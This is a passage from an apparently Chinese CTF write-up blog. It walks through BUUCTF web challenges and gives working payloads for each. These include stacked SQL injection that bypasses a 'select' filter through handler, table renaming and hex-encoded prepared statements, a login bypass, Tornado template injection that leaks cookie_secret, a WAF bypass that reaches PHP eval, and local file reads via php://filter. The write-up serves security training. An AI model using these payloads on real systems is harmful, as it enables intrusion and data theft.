class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;ctftraining&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;information_schema&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;mysql&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">18</span>) <span class="string">&quot;performance_schema&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;supersqli&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;test&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆表（当前数据库）：<code>1&#39;;show tables;#</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">16</span>) <span class="string">&quot;1919810931114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;words&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>words表应该就是测试数据，也就是该条语句的from接的应该就是words，那么flag应该在1919810931114514表中了。</p><p>而<code>select</code>关键字被拦截掉了，如何才能读取数据呢</p><h3 id="解法一：handler"><a href="#解法一：handler" class="headerlink" title="解法一：handler"></a>解法一：handler</h3><p>EXP：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">handler</span> <span class="string">`1919810931114514`</span> <span class="keyword">open</span> <span class="keyword">as</span> <span class="string">`yunenctf`</span>;<span class="keyword">handler</span> <span class="string">`yunenctf`</span> <span class="keyword">read</span> <span class="keyword">first</span>;<span class="comment">#</span></span><br><span class="line"><span class="comment"># handler `1919810931114514` open as `yunenctf`; 将数据表载入并将返回句柄重命名</span></span><br><span class="line"><span class="comment"># handler `yunenctf` read first; 读取指定句柄的首行数据</span></span><br></pre></td></tr></table></figure><h3 id="解法二：重命名rename"><a href="#解法二：重命名rename" class="headerlink" title="解法二：重命名rename"></a>解法二：重命名rename</h3><p>此方法有一定的危险性，若操作失败极容易损坏环境，请在公共靶机操作时注意查看payload。</p><p>首先查看words表下的字段信息：<code>1&#39;; show columns from words;#</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;id&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;int(10)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">6</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;data&quot;</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;varchar(20)&quot;</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">2</span>) <span class="string">&quot;NO&quot;</span></span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">  [<span class="number">4</span>]=&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">  [<span class="number">5</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">0</span>) <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>共有两字段，分别是id与data字段；</p><p>查看1919810931114514表的字段信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只有一个flag字段</p><p>EXP：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; <span class="keyword">rename</span> <span class="keyword">table</span> words <span class="keyword">to</span> word1; <span class="keyword">rename</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">to</span> words; <span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">add</span> <span class="keyword">id</span> <span class="built_in">int</span> <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">Null</span> auto_increment primary <span class="keyword">key</span>; <span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">100</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><ul><li>rename table words to word1; 将words表重命名为word1</li><li>rename table `1919810931114514` to words; 将 1919810931114514 重命名为words</li><li>alter table words add id int unsigned not Null auto_increment primary key; 为words表添加id字段并作为主键</li><li>alter table words change flag data varchar(100); 将words表的flag字段更名为data</li></ul><h3 id="解法三：预编译prepare"><a href="#解法三：预编译prepare" class="headerlink" title="解法三：预编译prepare"></a>解法三：预编译prepare</h3><p>由于<code>select</code>被拦截，故我们可以选择将<code>select * from `1919810931114514`</code>给转成16进制并存放到变量中，接着进行预编译处理并运行。</p><p>EXP：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;<span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><p>这题有点考脑洞的感觉，关键是你得猜出来他的SQL语句是怎么个拼接法。</p><p><code>select $_REQUEST[&#39;query&#39;]||flag from Flag</code></p><p>怎么猜呢？</p><ul><li>首先我们发现本题无报错信息，且任意非数字开头的输入均无返回。</li><li>其次尝试<code>1;show tables;#</code>等payload发现可以返回，堆叠注入存在，但是测试发现from、表名Flag、0x、handler被拦截，看来本题不想让我们能简单地以堆叠注入通过。</li><li>尝试输入<code>1,2,3,4</code>，发现返回内容为<code>Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 1 )</code>，可判断出注入位置。</li><li>尝试输入<code>1,2,3,0</code>，发现返回内容为<code>Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 0 )</code>，可以判断最后的0应该是被拼接上了<code>||</code>或字符。</li></ul><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一：*"></a>解法一：*</h3><p>通过堆叠注入的<code>show tables</code>可以知道，当前执行命令的表即为唯一的Flag表，故flag信息应该也在该表里边。输入<code>*,1</code>即可返回该表的所有字段数据。</p><p>EXP：<code>*,1</code></p><h3 id="解法二：pipes-as-concat"><a href="#解法二：pipes-as-concat" class="headerlink" title="解法二：pipes_as_concat"></a>解法二：pipes_as_concat</h3><p>据说此解才是预期解orz，<code>set sql_mode=pipes_as_concat;</code>的作用为将<code>||</code>的作用由or变为拼接字符串。</p><p>通过将<code>||</code>符号的含义改变成拼接字符串即可带出flag的值（如果是||其他东西就不行了）。</p><p>EXP：<code>1;set sql_mode=pipes_as_concat;select 1</code></p><h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><p>cl4y师傅写的题，出的还算简单，打开题目就亮瞎了我的狗眼，不愧是羽哥哥。</p><p><img src="https://img.0x002.com/article/BuuCTF/20200722004151.png" alt="EasySQL题目页面"></p><p>其实这个页面没啥用，真正功能在check.php。随便输入一个数据：<code>check.php?username=1&amp;password=1</code>，提示用户名与密码错误。</p><p>老规矩，单双引号与反斜杠走起，尝试单引号时就报错了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;1&#39;&#39; at line 1</span><br></pre></td></tr></table></figure><p>通常的登录判断实现有两种方法：</p><ul><li>在where语句后拼接username与password，判断是否返回数据的条数，若为0即账号密码错误。</li><li>先获取数据库中对于username的密码，再与password参数做比较。</li></ul><p>而这里是第一种判断方法，可以通过尝试在username和password单独加单引号，发现都会返回报错信息可以猜测出。</p><p>搞懂了这点这题就很简单了，EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">check.php?username&#x3D;1%27%201%3d1%23&amp;password&#x3D;2</span><br></pre></td></tr></table></figure><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><p>一看到tornado经常刷题的师傅（老赛棍）就知道了，SSTI必不可少。</p><p>打开题目首页映入眼帘的三个跳转链接：</p><p><a href="http://xxx.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=304613daa63f83664d004ef32b0add5e">/flag.txt</a><br><a href="http://xxx.buuoj.cn/file?filename=/welcome.txt&amp;filehash=526ef14f5eedb15cacf1f4b0c281ef1a">/welcome.txt</a><br><a href="http://xxx.node3.buuoj.cn/file?filename=/hints.txt&amp;filehash=b40f21b84d8adb13a98b455421e19522">/hints.txt</a></p><p>分别打开得到：</p><ul><li>flag in /fllllllllllllag</li><li>render</li><li>md5(cookie_secret+md5(filename))</li></ul><p>观察URL可以发现：file?filename=/hints.txt&amp;filehash=b40f21b84d8adb13a98b455421e19522</p><p>很明显，我们只需要找到cookie_secret就可以读取fllllllllllllag文件获得flag，而这需要通过SSTI获得。</p><p>SSTI模板注入位置：<code>error?msg=Error</code>，报错页面。报错页面存在SSTI也是常考点了</p><p>老规矩尝试49，发现被拦截了，返回<code>ORZ</code>，把<code>\*</code>去掉后确实能返回77，说明的确存在SSTI。</p><p>经过尝试，发现拦截了<code>_,(),[]</code>等，命令执行的路算被堵死了。</p><p>这里的考点就是tornado的handler.settings对象</p><p>在tornado中</p><p>handler 对象 是指向RequestHandler<br>而RequestHandler.settings又指向self.application.settings<br>所以所有handler.settings就指向RequestHandler.application.settings了！</p><p>而在模板中，handler是可用的，故访问:<code>error?msg=&#123;&#123;handler.settings&#125;&#125;</code>，记得得到cookie_secret。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;e23c0c77-a56a-444d-a44b-e74ee6ce5ba5&#39;&#125;</span><br></pre></td></tr></table></figure><p>所以/fllllllllllllag对应的hash就为md5(cookie_secret+md5(‘/fllllllllllllag’))，即：<code>c4a22e606c667e494b34c926adbc0a42</code>。</p><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;c4a22e606c667e494b34c926adbc0a42 #此处由于cookie_secret不同需要自己走一遍流程</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>签到题，无考点。</p><p>EXP：<code>/?cat=dog</code></p><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h2><p>打开题目，邮件查看HTML源代码，发现：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#calc&#x27;</span>).submit(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        $.ajax(&#123;</span></span><br><span class="line"><span class="javascript">            url:<span class="string">&quot;calc.php?num=&quot;</span>+<span class="built_in">encodeURIComponent</span>($(<span class="string">&quot;#content&quot;</span>).val()),</span></span><br><span class="line"><span class="javascript">            type:<span class="string">&#x27;GET&#x27;</span>,</span></span><br><span class="line"><span class="javascript">            success:<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                $(<span class="string">&quot;#result&quot;</span>).html(<span class="string">`&lt;div class=&quot;alert alert-success&quot;&gt;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="javascript">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">&quot;这啥?算不来!&quot;</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>访问calc.php，得到如下源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，这是个命令执行题，如何绕过黑名单执行命令是本题的考点。</p><p>经过尝试后发现，当num参数传入字母时便会被WAF拦截。这里有两种方法来绕过：</p><h3 id="法一：PHP黑魔法-20num"><a href="#法一：PHP黑魔法-20num" class="headerlink" title="法一：PHP黑魔法%20num"></a>法一：PHP黑魔法%20num</h3><p>PHP在接受请求参数时会忽略开头的空格，也就是说<code>?%20%20num=a</code>相当于<code>$_GET[&#39;num&#39;]=a</code>的效果。</p><p>WAF判断的参数仅是num，而对于%20num他是不做拦截的。</p><h3 id="法二：HTTP走私攻击"><a href="#法二：HTTP走私攻击" class="headerlink" title="法二：HTTP走私攻击"></a>法二：HTTP走私攻击</h3><p>这也是WAF绕过的老法子之一了，用在这里也是正常的操作。</p><p><img src="https://img.0x002.com/article/BuuCTF/20200722042731.png" alt="HTTP走私"></p><p>而对于单双引号被过滤的情况如何表示字符串，由于PHP的灵活性有挺多的法子，这里列举两个：</p><ul><li>一是利用chr()等转换函数，将ascii码转成单个字符串在用<code>.</code>拼接。</li><li>二是利用<code>~</code>取反等符号，如<code>~%9e</code>就代表字符串<code>a</code>。</li></ul><p>EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">calc.php?%20num&#x3D;var_dump(scandir(~%d0)) &#x2F;&#x2F; 列出根目录下的全部文件名</span><br><span class="line">calc.php?%20num&#x3D;highlight_file(~%D0%99%CE%9E%98%98) &#x2F;&#x2F; 读flag文件</span><br></pre></td></tr></table></figure><h2 id="极客大挑战-2019-Secret"><a href="#极客大挑战-2019-Secret" class="headerlink" title="[极客大挑战 2019]Secret"></a>[极客大挑战 2019]Secret</h2><p>打开题目，啥信息都没有，不清楚考点。老规矩，先查看返回头、HTML源代码，若无结果再开扫描器。</p><p><img src="https://img.0x002.com/article/BuuCTF/20200724231241.png" alt="题目页面"></p><p>在HTML源代码处发现提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;master&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./Archive_room.php&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;</span>&gt;</span>Oh! You found me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>打开<code>/Archive_room.php</code>文件，得：</p><p><img src="https://img.0x002.com/article/BuuCTF/20200724231506.png" alt="跳转链接"></p><p>点击之后发现被跳转到了<code>end.php</code>，易知<code>action.php</code>返回了跳转信息。打开Burpsuite抓取数据包重放得到：</p><p><img src="https://img.0x002.com/article/BuuCTF/20200724231645.png" alt="Burp抓包重放"></p><p>访问之，得PHP源代码一份：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="comment">// 简单防搅屎措施</span></span><br><span class="line">    <span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||stristr(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>很容易就知道此处的考点应该是LFI读文件，EXP：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><p>得到Base64编码过的flag.php源代码，解密之即可得flag。</p><p><img src="https://img.0x002.com/article/BuuCTF/20200724232057.png" alt="Base64解码"></p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>这题出的是真的不错，学到了很多东西，多刷好题还是有用的。</p><p>打开题目，在首页的HTML源代码处发现注释：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br></pre></td></tr></table></figure><p>猜测获取flag需要登录admin账户，我们先注册随便一个账号登录进去看看。</p><p>在change_password功能页的HTML源码中发现注释：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://github.com/woadsl1234/hctf_flask/ --&gt;</span></span><br></pre></td></tr></table></figure><p>这里贴一下主要源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response</span><br><span class="line"><span class="keyword">from</span> flask_login <span class="keyword">import</span> logout_user, LoginManager, current_user, login_user</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> app, db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> Config</span><br><span class="line"><span class="keyword">from</span> app.models <span class="keyword">import</span> User</span><br><span class="line"><span class="keyword">from</span> forms <span class="keyword">import</span> RegisterForm, LoginForm, NewpasswordForm</span><br><span class="line"><span class="keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="keyword">import</span> nodeprep</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">from</span> code <span 